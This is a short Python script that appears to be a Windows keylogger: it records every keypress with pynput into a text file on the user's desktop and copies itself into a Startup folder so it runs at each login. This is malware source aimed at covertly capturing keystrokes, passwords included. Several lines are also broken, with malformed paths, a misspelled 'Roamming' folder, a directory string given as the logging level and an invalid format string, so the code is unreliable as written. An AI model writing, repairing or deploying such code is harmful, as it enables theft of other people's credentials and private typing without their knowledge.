from pynput.keyboard import Listener
import os
import logging
from shutil import copyfile

username = os.getlogin()
logging_directory = f"C:\Users{username}\Desktop"

copyfile('keylogger.py',
         f'C:User/{username}/AppData/Roamming/Microsoft/Startup/keylogger.py')

logging.basicConfig(filename=f'{logging_directory}/mylog.txt',
                    level=logging_directory, format="%(action)%:%(message)%")


def key_handler(key):
    logging.info(key)


with Listener(on_press=key_handler) as Listener:
    Listener.join()
